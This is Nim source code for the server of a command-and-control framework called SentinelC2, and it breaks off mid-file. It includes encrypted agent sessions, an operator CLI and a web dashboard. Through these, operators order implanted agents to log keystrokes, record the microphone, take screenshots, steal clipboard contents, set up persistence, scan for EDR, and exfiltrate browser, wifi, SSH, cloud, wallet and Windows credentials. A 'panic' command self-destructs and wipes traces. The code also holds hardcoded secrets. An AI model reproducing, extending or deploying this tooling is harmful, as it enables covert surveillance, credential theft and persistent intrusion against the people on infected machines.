# c2_server.nim — SentinelC2 Server (v2)
# Build:
#   nim c -d:release -d:ssl --threads:on --opt:speed c2_server.nim
#
# Changes from v1:
#   * Per-agent session keys derived after mutual HMAC auth
#   * Per-message AES-256-GCM with AAD (agent_id || direction) + counter nonce
#   * Reconnect-resistant: session key never leaves RAM; restarts force re-auth
#   * New commands: ps, clip, find, sleep, killdate, c2
#   * Upload (operator -> agent): operator pastes b64 chunks, server
#     stitches into per-agent upload buffer and finalises
#   * Auto-assemble for downloads: server writes received chunks to disk
#   * Monotonic command_id; server tags every command with one; agent
#     dedups on it
#   * Async CLI thread using --threads:on; alerts on stdin close but
#     keeps the listener alive
#   * Persistent session log (per-agent file in ./logs/)
#   * Command aliases (sh, dl, up, etc.)
#   * Build-time randomized prompt strings via BuildPrefix

import std/[asyncdispatch, asyncnet, asynchttpserver, nativesockets, json, os, times, random,
          base64, strutils, tables, locks, asyncfutures, math, strformat,
          options, critbits, sets, sha1, monotimes]
import std/collections/deques
import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael]
import winim/lean

when not defined(BuildPrefix):
  const BuildPrefix = "X7K"

const
  LISTEN_HOST = "0.0.0.0"
  LISTEN_PORT = 8443
  WEB_HOST = "0.0.0.0"
  WEB_PORT = 8080
  SERVER_LOG = "server.log"
  # Web dashboard auth — Basic auth. Set your own per deployment.
  # To rotate: change these constants and rebuild.
  WEB_AUTH_USER = "operator"
  WEB_AUTH_PASSWORD = "S3nt1n3l-C2-D3v-Only-CHANGEME"
  SECRET = "sentinel-engagement-q4-2026-echo-tango-whiskey"
  PBKDF2_ITER = 600_000
  WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
  LOGS_DIR = "logs"
  UPLOADS_DIR = "uploads"
  DOWNLOADS_DIR = "downloads"

const
  AAD_DIR_S2A = 0x00'u8
  AAD_DIR_A2S = 0x01'u8

# ------------------------------------------------------------
# CRYPTO
# ------------------------------------------------------------
type
  AgentSession = ref object
    id, remoteAddr, hostname, osInfo, username, privileges: string
    connectedAt, lastBeacon: DateTime
    key: array[32, byte]
    peerNonce: array[16, byte]  # agent's nonce
    sendCtr: uint32
    lastCmdId: int64
    # Per-agent download assembler
    dlDir: string
    dlFiles: Table[string, tuple[f: File, total, got: int, lastIdx: int]]
    # Per-agent upload assembler
    upDir: string
    upFiles: Table[string, tuple[f: File, total, got: int]]
    # Out-of-band command queue (we send to agent on the next tick)
    cmdQueue: seq[JsonNode]

var agents = initTable[string, AgentSession]()
var agentsLock: Lock

# ------------------------------------------------------------
# ASYNC QUEUE (lock + seq, with optional blocking put for sync callers)
# ------------------------------------------------------------
type
  AsyncQueue[T] = ref object
    lk: Lock
    items: seq[T]

proc newAsyncQueue[T](): AsyncQueue[T] =
  new(result)
  initLock(result.lk)
  result.items = @[]

proc put*[T](q: AsyncQueue[T], item: T) =
  acquire(q.lk)
  q.items.add(item)
  release(q.lk)

proc tryGet*[T](q: AsyncQueue[T]): Option[T] =
  acquire(q.lk)
  defer: release(q.lk)
  if q.items.len > 0:
    let v = q.items[0]
    q.items.delete(0)
    some(v)
  else:
    none(T)

proc get*[T](q: AsyncQueue[T]): Future[T] {.async.} =
  while true:
    let r = q.tryGet()
    if r.isSome: return r.get
    await sleepAsync(50)

# ------------------------------------------------------------
# CRYPTO (matching agent v2)
# ------------------------------------------------------------
proc deriveSessionKey(secret: string,
                      ourNonce, peerNonce: openArray[byte]): array[32, byte] =
  var ctx: HMAC[sha256]
  ctx.init(secret)
  ctx.update(ourNonce)
  ctx.update(peerNonce)
  let d = ctx.finish()
  for i in 0..<32: result[i] = d.data[i]
  ctx.clear()

proc makeNonce(ctr: uint32, randBytes: openArray[byte]): array[12, byte] =
  result[0] = byte((ctr shr 24) and 0xFF)
  result[1] = byte((ctr shr 16) and 0xFF)
  result[2] = byte((ctr shr 8) and 0xFF)
  result[3] = byte(ctr and 0xFF)
  for i in 0..<8: result[4 + i] = randBytes[i]

proc makeAad(agentId: string, dir: byte): seq[byte] =
  result = newSeqOfCap[byte](agentId.len + 1)
  for c in agentId: result.add(byte(c))
  result.add(dir)

proc encryptFrame(s: AgentSession, plain: string): seq[byte] =
  var randBytes: array[8, byte]
  for i in 0..<8: randBytes[i] = rand(255).byte
  let nonce = makeNonce(s.sendCtr, randBytes)
  inc s.sendCtr
  let aad = makeAad(s.id, AAD_DIR_S2A)
  var ctx: GCM[aes256]
  ctx.init(s.key, nonce, aad)
  let pt = cast[seq[byte]](plain)
  var ct = newSeq[byte](pt.len)
  ctx.encrypt(pt, ct)
  let tag = ctx.getTag()
  result = newSeqOfCap[byte](12 + ct.len + 16)
  for b in nonce: result.add(b)
  for b in ct: result.add(b)
  for b in tag: result.add(b)

proc decryptFrame(s: AgentSession, blob: openArray[byte]): string =
  if blob.len < 28: return ""
  var nonce: array[12, byte]
  for i in 0..<12: nonce[i] = blob[i]
  let ctLen = blob.len - 12 - 16
  if ctLen < 0: return ""
  let ct = blob[12 ..< 12 + ctLen]
  let tag = blob[blob.len - 16 ..< blob.len]
  let aad = makeAad(s.id, AAD_DIR_A2S)
  var ctx: GCM[aes256]
  ctx.init(s.key, nonce, aad)
  var pt = newSeq[byte](ct.len)
  if not ctx.decrypt(ct, pt, tag): return ""
  result = cast[string](pt)

proc hmacHex(secret, data: string): string =
  toHex(sha256.hmac(secret, data).data)

proc hexToBytes(s: string): seq[byte] =
  result = newSeq[byte](s.len div 2)
  for i in 0..<result.len:
    result[i] = byte(parseHexInt(s[i*2 .. i*2+1]))

proc bytesToHex(b: openArray[byte]): string =
  result = newString(b.len * 2)
  for i in 0..<b.len:
    result[i*2]   = "0123456789abcdef"[(b[i] shr 4) and 0xF]
    result[i*2+1] = "0123456789abcdef"[b[i] and 0xF]

# ------------------------------------------------------------
# SESSION LOG (per-agent)
# ------------------------------------------------------------
proc logPath(agentId: string): string =
  createDir(LOGS_DIR)
  result = LOGS_DIR / (agentId & ".log")

proc logLine(agentId, line: string) =
  try:
    let f = open(logPath(agentId), fmAppend)
    defer: f.close()
    let ts = now().format("yyyy-MM-dd HH:mm:ss")
    f.writeLine("[" & ts & "] " & line)
  except:
    # last-resort fallback: write to server.log
    try:
      let f = open(SERVER_LOG, fmAppend)
      defer: f.close()
      f.writeLine("[" & now().format("yyyy-MM-dd HH:mm:ss") & "] log-fail: " & getCurrentExceptionMsg())
    except: discard

# Server-level log: exception traces, web access, X25519 lifecycle.
# Use this for anything that doesn't fit per-agent logs.
proc serverLog(line: string) =
  try:
    let f = open(SERVER_LOG, fmAppend)
    defer: f.close()
    let ts = now().format("yyyy-MM-dd HH:mm:ss")
    f.writeLine("[" & ts & "] " & line)
  except: discard

# ------------------------------------------------------------
# WEBSOCKET FRAMING (manual; same as v1)
# ------------------------------------------------------------
proc sendWsFrame(sock: AsyncSocket, data: seq[byte]) {.async.} =
  var frame = @[0x81.byte]
  let L = data.len
  if L < 126:
    frame.add(L.byte)
  elif L < 65536:
    frame.add(126.byte)
    let ext: array[2, byte] = [byte((L shr 8) and 0xFF), byte(L and 0xFF)]
    frame.add(ext)
  else:
    frame.add(127.byte)
    var be: array[8, byte]
    for i in 0..<8:
      be[i] = byte((L shr (56 - i*8)) and 0xFF)
    frame.add(be)
  frame.add(data)
  await sock.send(cast[string](frame))

proc recvWsFrame(sock: AsyncSocket): Future[seq[byte]] {.async.} =
  var hdr: array[2, byte]
  let n1 = await sock.recvInto(addr hdr[0], 2)
  if n1 != 2: return @[]
  let op = hdr[0] and 0x0F
  let masked = (hdr[1] and 0x80) != 0
  var L = int(hdr[1] and 0x7F)
  if L == 126:
    var ext: array[2, byte]
    let n2 = await sock.recvInto(addr ext[0], 2)
    if n2 != 2: return @[]
    L = (int(ext[0]) shl 8) or int(ext[1])
  elif L == 127:
    var ext: array[8, byte]
    let n3 = await sock.recvInto(addr ext[0], 8)
    if n3 != 8: return @[]
    L = 0
    for i in 0..<8: L = (L shl 8) or int(ext[i])
  var mask: array[4, byte]
  if masked:
    let n4 = await sock.recvInto(addr mask[0], 4)
    if n4 != 4: return @[]
  var payload = newSeq[byte](L)
  var off = 0
  while off < L:
    let r = await sock.recvInto(addr payload[off], L - off)
    if r <= 0: return @[]
    off += r
  if masked:
    for i in 0..<L: payload[i] = payload[i] xor mask[i mod 4]
  if op == 0x8: return @[]
  if op == 0x9:
    await sendWsFrame(sock, @[0x8A.byte])
    return @[]
  result = payload

proc wsUpgrade(client: AsyncSocket): Future[bool] {.async.} =
  var buf = ""
  while true:
    var ch: array[1, byte]
    let n = await client.recvInto(addr ch[0], 1)
    if n != 1: return false
    buf.add(char(ch[0]))
    if buf.endsWith("\r\n\r\n"): break
  var key = ""
  for line in buf.split("\r\n")[1..^1]:
    let p = line.split(": ", 1)
    if p.len == 2 and p[0].toLowerAscii == "sec-websocket-key":
      key = p[1].strip
  if key.len == 0: return false
  var sha1ctx = newSha1State()
  sha1ctx.update(key & WS_GUID)
  let digest = finalize(sha1ctx)
  var bs: seq[byte] = @[]
  for b in digest: bs.add(byte(b))
  let accept = base64.encode(bs)
  await client.send("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " & accept & "\r\n\r\n")
  true

# ------------------------------------------------------------
# DOWNLOAD ASSEMBLY (server-side)
# ------------------------------------------------------------
proc ensureAgentDirs(s: AgentSession) =
  if s.dlDir.len == 0:
    s.dlDir = DOWNLOADS_DIR / s.id
    createDir(s.dlDir)
  if s.upDir.len == 0:
    s.upDir = UPLOADS_DIR / s.id
    createDir(s.upDir)

proc openDownloadFile(s: AgentSession, path: string, total: int): File =
  ensureAgentDirs(s)
  # Sanitize: keep only the basename to prevent path traversal
  let name = path.extractFilename
  if name.len == 0: return nil
  let fullPath = s.dlDir / name
  result = open(fullPath, fmWrite)
  logLine(s.id, "[download] " & fullPath & " (" & $total & " chunks)")

proc handleFileChunk(s: AgentSession, m: JsonNode) =
  let path = m["filepath"].getStr("")
  let idx = m["chunk_index"].getInt(0)
  let total = m["total_chunks"].getInt(0)
  let lastChunk = m["last_chunk"].getBool(false)
  let dataB64 = m["data"].getStr("")
  let data = base64.decode(dataB64)
  if not s.dlFiles.hasKey(path):
    let f = openDownloadFile(s, path, total)
    if f == nil: return
    s.dlFiles[path] = (f, total, 0, -1)
  var entry = s.dlFiles[path]
  if entry.lastIdx == idx:
    return  # duplicate
  discard writeBuffer(entry.f, addr data[0], data.len)
  inc entry.got
  entry.lastIdx = idx
  s.dlFiles[path] = entry
  if lastChunk or entry.got >= entry.total:
    entry.f.close()
    s.dlFiles.del(path)
    logLine(s.id, "[download] done: " & path)
    echo "[" & BuildPrefix & " +] ", s.id, " -> ", path

# ------------------------------------------------------------
# AGENT HANDLER
# ------------------------------------------------------------
proc handleAgent(client: AsyncSocket) {.async.} =
  if not await wsUpgrade(client): client.close(); return
  var agentId = ""
  let done = newFuture[void]("agent_done")

  try:
    let raw = await client.recvWsFrame()
    if raw.len == 0: client.close(); return

    # First frame is registration: NOT encrypted yet (we need to derive
    # the session key first). We expect {p, h, an} in plaintext.
    let ptext = cast[string](raw)
    let regMsg = parseJson(ptext)
    let payload = regMsg["p"].getStr("")
    let agentHmac = regMsg["h"].getStr("")
    let anB64 = (if regMsg.hasKey("an"): regMsg["an"].getStr() else: "")
    if anB64.len == 0:
      await client.sendWsFrame(cast[seq[byte]](
        "{\"status\":\"rejected\",\"reason\":\"no_nonce\"}"))
      client.close(); return
    if hmacHex(SECRET, payload) != agentHmac:
      await client.sendWsFrame(cast[seq[byte]](
        "{\"status\":\"rejected\",\"reason\":\"bad_hmac\"}"))
      client.close(); return

    # Parse the agent's nonce + info — nonce comes from the "an" field
    let infoJson = payload
    let ourAgentNonce = base64.decode(anB64)
    if ourAgentNonce.len != 16:
      client.close(); return

    # Generate server nonce, derive session key
    var sn: array[16, byte]
    for i in 0..<16: sn[i] = rand(255).byte
    let snHex = bytesToHex(sn)

    agentId = $rand(100000..999999) & $rand(100000..999999)
    let info = parseJson(infoJson)

    # Send registration ack (still in plaintext) with server nonce
    let ack = $ %* {"status": "registered", "agent_id": agentId, "sn": snHex}
    await client.sendWsFrame(cast[seq[byte]](ack))

    # Create session
    let session = AgentSession(
      id: agentId, remoteAddr: client.getPeerAddr()[0],
      connectedAt: now(), lastBeacon: now(),
      hostname: info["h"].getStr("?"), osInfo: info["o"].getStr("?"),
      username: info["u"].getStr("?"), privileges: info["p"].getStr("?")
    )
    # Session key: server's view is (server_nonce || agent_nonce)
    for i in 0..<16: session.peerNonce[i] = ourAgentNonce[i].byte
    session.key = deriveSessionKey(SECRET, sn, cast[seq[byte]](ourAgentNonce))

    withLock agentsLock: agents[agentId] = session
    echo "[" & BuildPrefix & " +] ", agentId, " registered: ",
         session.hostname, " | ", session.username
    logLine(agentId, "[connect] " & session.hostname & " " &
            session.username & " (" & session.privileges & ")")

    proc sender() {.async.} =
      while true:
        let fut = newFuture[JsonNode]("dequeue")
        proc poll() {.async.} =
          while true:
            let x = session.cmdQueue
            if x.len > 0:
              session.cmdQueue.delete(0)
              fut.complete(x[0])
              return
            await sleepAsync(50)
        asyncCheck poll()
        let ok = await withTimeout(fut, 15000)
        if ok:
          let cmd = fut.read
          try:
            await client.sendWsFrame(encryptFrame(session, $cmd))
            session.lastBeacon = now()
            logLine(session.id, "[>] " & $cmd)
          except: break
        else:
          try:
            # Idle ping (encrypted with session key)
            await client.sendWsFrame(encryptFrame(session,
              $ %* {"cmd": "ping"}))
          except: break

    proc receiver() {.async.} =
      while true:
        let frame = await client.recvWsFrame()
        if frame.len == 0: break
        let d = decryptFrame(session, frame)
        if d.len == 0: continue
        let m = parseJson(d)
        case m["type"].getStr("")
        of "output":
          let txt = m["data"].getStr("")
          # Always write full to per-agent log so it doesn't interrupt
          # the operator's CLI input. Print a short status to console.
          logLine(session.id, "[<] " & txt)
          let lines = txt.splitLines.len
          let firstLine = (if txt.splitLines.len > 0: txt.splitLines[0] else: "")
          let brief = (if lines <= 1 and firstLine.len < 100: firstLine
                       else: firstLine[0..<min(80, firstLine.len)] & " (" & $lines & " lines, see logs/" & session.id & ".log)")
          echo "[" & BuildPrefix & " <] ", session.id, ": ", brief
        of "file_chunk":
          handleFileChunk(session, m)
        of "ps":
          # Process list dump — log the full table, only print a one-liner
          # to console so it doesn't corrupt the input line.
          let nrows = m.getOrDefault("rows").len
          var full = "ps (" & $nrows & " rows):\n"
          for r in m.getOrDefault("rows"):
            full.add("  pid=" & $r["pid"].getInt() & " ppid=" & $r["ppid"].getInt() &
                     " name=" & r["name"].getStr() & "\n")
          logLine(session.id, full)
          echo "[" & BuildPrefix & " <] ", session.id, " : ps (", nrows, " rows, see logs/", session.id, ".log)"
        of "find":
          # Find results — log full, print only count to console.
          let nrows = m.getOrDefault("count").getInt(0)
          var full = "find (" & $nrows & " matches):\n"
          for r in m.getOrDefault("rows"):
            full.add("  " & r["path"].getStr() & " (" & $r["size"].getInt() & " bytes)\n")
          logLine(session.id, full)
          echo "[" & BuildPrefix & " <] ", session.id, " : find (", nrows, " matches, see logs/", session.id, ".log)"
        of "heartbeat":
          # Silent — only used to keep the session alive.
          session.lastBeacon = now()
        else: discard
      done.complete()

    asyncCheck sender()
    asyncCheck receiver()
    await done
  except:
    serverLog("agent handler exception for " & agentId & ": " & getCurrentExceptionMsg())

  withLock agentsLock: agents.del(agentId)
  logLine(agentId, "[disconnect]")
  echo "[" & BuildPrefix & " -] ", agentId, " disconnected"
  client.close()

# ------------------------------------------------------------
# CLI (async, with aliases + command_id)
# ------------------------------------------------------------
var cliCh: Channel[string]
var nextCmdId: int64 = 0

proc age(s: AgentSession): string =
  let secs = (now() - s.connectedAt).inSeconds
  result = intToStr(secs div 3600, 2) & ":" &
           intToStr((secs mod 3600) div 60, 2) & ":" &
           intToStr(secs mod 60, 2)

proc cliThread() {.thread.} =
  while true:
    try:
      stdout.write BuildPrefix & "> "; stdout.flushFile()
      cliCh.send(stdin.readLine())
    except IOError, OSError, ValueError:
      stdout.write "\r\n[" & BuildPrefix & " !] stdin closed, CLI offline.\r\n"
      stdout.flushFile()
      cliCh.send("__stdin_closed__")
      break

proc helpText(): string =
  result = "Commands:\n" &
           "  list                           - list connected agents\n" &
           "  help                           - this text\n" &
           "  shell/sh <id> <cmd>            - run shell command\n" &
           "  download/dl <id> <path>        - download file from agent\n" &
           "  upload/up <id> <remotepath> <base64>\n" &
           "  screenshot/ss <id>             - take screenshot\n" &
           "  mic/m <id> [seconds]          - capture mic audio (default 10s, max 120s) -> downloads/mic_<ts>.wav\n" &
           "  ps <id>                        - list processes on agent\n" &
           "  clip <id>                      - get clipboard\n" &
           "  find <id> <path>;<mask>        - find files\n" &
           "  keys/k <id> {start|stop}       - keylogger control\n" &
           "  persist/p <id>                 - re-establish persistence\n" &
           "  exfil <id> <kind>              - browser|wifi|cloud|ssh|media|wallet|recent|wincreds\n" &
           "  recon <id> <kind>              - edr|shares|software|usb|tasks\n" &
           "  killdate <id> <unix_ts>        - set kill date (0 = clear)\n" &
           "  sleep <id> <minutes>           - set sleep between reconnects\n" &
           "  tg <id>                        - telegram-test ping\n" &
           "  kill/x <id>                    - uninstall and quit\n" &
           "  panic <id>                     - emergency self-destruct (wipes all traces)\n" &
           "  quit                           - exit server\n"

proc buildCmd(cmd: string, args: string = ""): JsonNode =
  inc nextCmdId
  result = %* {"cmd": cmd, "args": args, "cid": nextCmdId}

proc dispatch(line: string): string =
  let p = line.strip.split(" ", maxsplit=2)
  if p.len == 0: return ""
  case p[0]
  of "quit", "exit", "q": quit(0)
  of "help", "?": return helpText()
  of "list", "ls":
    withLock agentsLock:
      if agents.len == 0: return "No agents."
      result = "ID\t\tHost\t\tUser\t\tOS\t\tUptime\n"
      for id, a in agents.pairs:
        result.add(id & "\t" & a.hostname & "\t" & a.username & "\t" &
                   a.osInfo & "\t" & a.age() & "\n")
  of "shell", "sh", "download", "dl", "screenshot", "ss", "ps",
     "clip", "find", "keys", "k", "persist", "p", "killdate",
     "sleep", "kill", "x", "exfil", "recon", "tg", "panic",
     "mic", "m":
    if p.len < 2: return "Usage: " & p[0] & " <id> [args]\n"
    let cmd = block:
      var c = p[0]
      case c
      of "sh": "shell"
      of "dl": "download"
      of "ss": "screenshot"
      of "k": "keylogger"
      of "p": "persist"
      of "x": "kill"
      of "m": "mic"
      else: c
    if cmd == "screenshot" or cmd == "persist" or cmd == "kill" or
       cmd == "panic" or
       cmd == "ps" or cmd == "clip" or cmd == "tg":
      if p.len < 2: return "Usage: " & p[0] & " <id>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd(cmd))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "exfil" or cmd == "recon":
      # exfil/recon take a kind: browser|wifi|cloud|ssh|media|wallet|recent|wincreds
      #                       and: edr|shares|software|usb|tasks
      if p.len < 3: return "Usage: " & p[0] & " <id> <kind>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd(cmd, p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "keylogger":
      if p.len < 3: return "Usage: " & p[0] & " <id> {start|stop}\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd("keylogger", p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "killdate" or cmd == "sleep":
      if p.len < 3: return "Usage: " & p[0] & " <id> <value>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd(cmd, p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "mic":
      # mic <id> [seconds]  — seconds is optional, agent defaults to 10s
      if p.len < 2: return "Usage: " & p[0] & " <id> [seconds]\n"
      let argStr = if p.len >= 3: p[2] else: ""
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd("mic", argStr))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    elif cmd == "find":
      if p.len < 3: return "Usage: " & p[0] & " <id> <path>;<mask>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd("find", p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
    else:  # shell / download
      if p.len < 3: return "Usage: " & p[0] & " <id> <args>\n"
      withLock agentsLock:
        if p[1] in agents:
          agents[p[1]].cmdQueue.add(buildCmd(cmd, p[2]))
          return "[" & BuildPrefix & " >] queued for " & p[1]
        return "[!] not found: " & p[1]
  of "upload", "up":
    if p.len < 3: return "Usage: " & p[0] & " <id> <remotepath> <base64>\n"
    # args are: <id> <remotepath> <base64-chunk>
    let sp = p[2].split(" ", maxsplit=1)
    if sp.len < 2: return "Usage: " & p[0] & " <id> <remotepath> <base64>\n"
    withLock agentsLock:
      if p[1] in agents:
        agents[p[1]].cmdQueue.add(
          %* {"cmd": "upload", "path": sp[0], "data": sp[1], "cid": nextCmdId})
        return "[" & BuildPrefix & " >] upload queued for " & p[1]
      return "[!] not found: " & p[1]
  else: return "Unknown: " & p[0] & " (try 'help')\n"

proc processCli() {.async.} =
  while true:
    let r = cliCh.tryRecv()
    if r.dataAvailable:
      let line = r.msg
      if line == "__stdin_closed__": break
      let outp = dispatch(line)
      if outp.len > 0: stdout.write(outp); stdout.flushFile()
    await sleepAsync(50)

# ------------------------------------------------------------
# WEB DASHBOARD (embedded HTTP server, port WEB_PORT)
# ------------------------------------------------------------
# Serves a single-page dashboard on WEB_PORT. The dashboard polls
# /api/agents for the live agent list and /api/log/<id>?since=N to
# tail the per-agent log file. Commands are dispatched via POST
# /api/cmd and operator can browse /downloads/* for exfiltrated files.
#
# Design: deliberately simple. No auth (use firewall / tailnet ACL).
# State lives in the same agents table the CLI uses. The web server
# is started alongside the CLI in main().
# ------------------------------------------------------------

var bootTime* = now()

const DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SentinelC2 Dashboard</title>
<style>
  * { box-sizing: border-box; }
  body { font: 13px/1.4 -apple-system, "Segoe UI", Consolas, monospace;
         background: #0e1117; color: #d8dee9; margin: 0; }
  header { background: #161b22; padding: 12px 20px;
           border-bottom: 1px solid #30363d; display: flex;
           justify-content: space-between; align-items: center; }
  header h1 { font-size: 16px; margin: 0; color: #58a6ff; }
  .status { color: #6e7681; font-size: 11px; }
  .status .ok { color: #3fb950; }
  main { display: grid; grid-template-columns: 360px 1fr;
         height: calc(100vh - 50px); }
  .sidebar { background: #0d1117; border-right: 1px solid #30363d;
             overflow-y: auto; }
  .sidebar h2 { font-size: 11px; text-transform: uppercase;
                color: #6e7681; padding: 12px 16px 6px; margin: 0; }
  .agent { padding: 10px 16px; cursor: pointer;
           border-bottom: 1px solid #161b22; }
  .agent:hover { background: #161b22; }
  .agent.active { background: #1f2937; border-left: 3px solid #58a6ff; }
  .agent .id { color: #58a6ff; font-weight: bold; }
  .agent .meta { color: #6e7681; font-size: 11px; margin-top: 2px; }
  .pane { display: flex; flex-direction: column; overflow: hidden; }
  .toolbar { padding: 10px 16px; background: #161b22;
             border-bottom: 1px solid #30363d; display: flex; gap: 8px;
             flex-wrap: wrap; }
  .toolbar input, .toolbar select { background: #0d1117;
             color: #d8dee9; border: 1px solid #30363d;
             padding: 6px 8px; font: inherit; border-radius: 4px; }
  .toolbar input[type=text] { flex: 1; min-width: 200px; }
  .toolbar button { background: #238636; color: white; border: none;
             padding: 6px 12px; border-radius: 4px; cursor: pointer; }
  .toolbar button:hover { background: #2ea043; }
  .toolbar .secondary { background: #21262d; }
  .toolbar .secondary:hover { background: #30363d; }
  .log { flex: 1; overflow-y: auto; padding: 12px 16px;
         background: #010409; font-size: 12px;
         white-space: pre-wrap; word-break: break-all; }
  .log .line { padding: 1px 0; }
  .log .ts { color: #6e7681; }
  .log .in { color: #d2a8ff; }
  .log .out { color: #7ee787; }
  .log .info { color: #58a6ff; }
  .log .err { color: #f85149; }
  .empty { color: #6e7681; text-align: center; padding: 60px 20px; }
  .files { padding: 8px 16px; background: #161b22;
           border-top: 1px solid #30363d; max-height: 140px;
           overflow-y: auto; font-size: 11px; }
  .files a { color: #58a6ff; text-decoration: none; margin-right: 12px; }
  .files a:hover { text-decoration: underline; }
  .badge { display: inline-block; padding: 1px 6px; border-radius: 3px;
           font-size: 10px; margin-left: 4px; }
  .badge.admin { background: #da3633; color: white; }
  .badge.user { background: #6e7681; color: white; }
</style>
</head>
<body>
<header>
  <h1>SentinelC2 Dashboard</h1>
  <div class="status">
    <span id="srv-info">connecting...</span> |
    agents: <span id="agent-count" class="ok">0</span>
  </div>
</header>
<main>
  <div class="sidebar">
    <h2>Connected Agents</h2>
    <div id="agent-list"><div class="empty">no agents</div></div>
  </div>
  <div class="pane">
    <div class="toolbar">
      <input type="text" id="cmd" placeholder="command (e.g. shell whoami / recon edr / exfil wifi)">
      <select id="cmd-kind">
        <option>shell</option>
        <option>recon</option>
        <option>exfil</option>
        <option>ps</option>
        <option>clip</option>
        <option>screenshot</option>
        <option>mic</option>
        <option>find</option>
        <option>persist</option>
        <option>kill</option>
        <option>panic</option>
      </select>
      <button onclick="sendCmd()">Run</button>
      <button class="secondary" onclick="refreshAll()">Refresh</button>
    </div>
    <div class="log" id="log"><div class="empty">select an agent</div></div>
    <div class="files" id="files"></div>
  </div>
</main>
<script>
let activeId = null;
let lastLogSize = 0;
let pollTimer = null;

function $(id) { return document.getElementById(id); }

async function fetchJson(url, opts) {
  const r = await fetch(url, opts);
  return await r.json();
}

async function refreshAgents() {
  try {
    const data = await fetchJson('/api/agents');
    $('agent-count').textContent = data.agents.length;
    $('srv-info').textContent = 'uptime ' + Math.floor(data.uptime_s) + 's';
    if (data.agents.length === 0) {
      $('agent-list').innerHTML = '<div class="empty">no agents</div>';
    } else {
      $('agent-list').innerHTML = data.agents.map(a => `
        <div class="agent ${a.id === activeId ? 'active' : ''}"
             onclick="selectAgent('${a.id}')">
          <div class="id">${a.id}
            <span class="badge ${a.privileges === 'admin' ? 'admin' : 'user'}">
              ${a.privileges}</span>
          </div>
          <div class="meta">${escapeHtml(a.hostname)} / ${escapeHtml(a.username)}</div>
          <div class="meta">${escapeHtml(a.os)} - up ${a.uptime}</div>
        </div>
      `).join('');
    }
  } catch (e) {
    $('srv-info').textContent = 'disconnected';
  }
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, c => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[c]));
}

async function selectAgent(id) {
  activeId = id;
  lastLogSize = 0;
  $('log').innerHTML = '';
  refreshAgents();
  refreshLog();
  refreshFiles();
}

async function refreshLog() {
  if (!activeId) return;
  try {
    const r = await fetch('/api/log/' + activeId + '?since=' + lastLogSize);
    const data = await r.json();
    if (data.text) {
      const el = $('log');
      const atBottom = el.scrollHeight - el.scrollTop - el.clientHeight < 50;
      for (const line of data.text.split('\\n')) {
        if (!line) continue;
        const d = document.createElement('div');
        d.className = 'line';
        let cls = '';
        if (line.includes('[<]')) cls = 'out';
        else if (line.includes('[>]')) cls = 'in';
        else if (line.includes('[+]') || line.includes('[*]')) cls = 'info';
        else if (line.includes('[!]')) cls = 'err';
        d.innerHTML = '<span class="ts">' + escapeHtml(line.substring(0, 19)) + '</span> ' +
                      '<span class="' + cls + '">' +
                      escapeHtml(line.substring(20)) + '</span>';
        el.appendChild(d);
      }
      if (atBottom) el.scrollTop = el.scrollHeight;
    }
    lastLogSize = data.total_size;
  } catch (e) {}
}

async function refreshFiles() {
  if (!activeId) return;
  try {
    const data = await fetchJson('/api/files/' + activeId);
    if (data.files && data.files.length) {
      $('files').innerHTML = '<b>downloads:</b> ' + data.files.map(f =>
        '<a href="/downloads/' + activeId + '/' + encodeURIComponent(f) +
        '" target="_blank">' + escapeHtml(f) + '</a>'
      ).join('');
    } else {
      $('files').innerHTML = '';
    }
  } catch (e) {}
}

async function sendCmd() {
  if (!activeId) { alert('select an agent first'); return; }
  const kind = $('cmd-kind').value;
  const args = $('cmd').value.trim();
  try {
    const r = await fetch('/api/cmd', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: activeId, cmd: kind, args: args })
    });
    const data = await r.json();
    if (data.ok) {
      $('cmd').value = '';
      appendLogLine('[>] queued: ' + kind + ' ' + args);
    } else {
      appendLogLine('[!] ' + data.error);
    }
  } catch (e) {
    appendLogLine('[!] ' + e);
  }
}

function appendLogLine(text) {
  const el = $('log');
  const d = document.createElement('div');
  d.className = 'line';
  d.innerHTML = '<span class="in">' + escapeHtml(text) + '</span>';
  el.appendChild(d);
  el.scrollTop = el.scrollHeight;
}

function refreshAll() {
  refreshAgents();
  refreshLog();
  refreshFiles();
}

document.getElementById('cmd').addEventListener('keydown', e => {
  if (e.key === 'Enter') sendCmd();
});

refreshAgents();
pollTimer = setInterval(refreshAll, 1500);
</script>
</body>
</html>
"""

proc jsonResp(req: Request, code: HttpCode, body: string) {.async, gcsafe.} =
  await req.respond(code, body,
                    newHttpHeaders({"Content-Type": "application/json",
                                    "Access-Control-Allow-Origin": "*"}))

proc sendWebFile(req: Request, path: string, contentType: string) {.async, gcsafe.} =
  try:
    let data = readFile(path)
    await req.respond(Http200, data,
                      newHttpHeaders({"Content-Type": contentType}))
  except:
    await req.respond(Http404, "not found",
                      newHttpHeaders({"Content-Type": "text/plain"}))

proc apiAgents(req: Request) {.async, gcsafe.} =
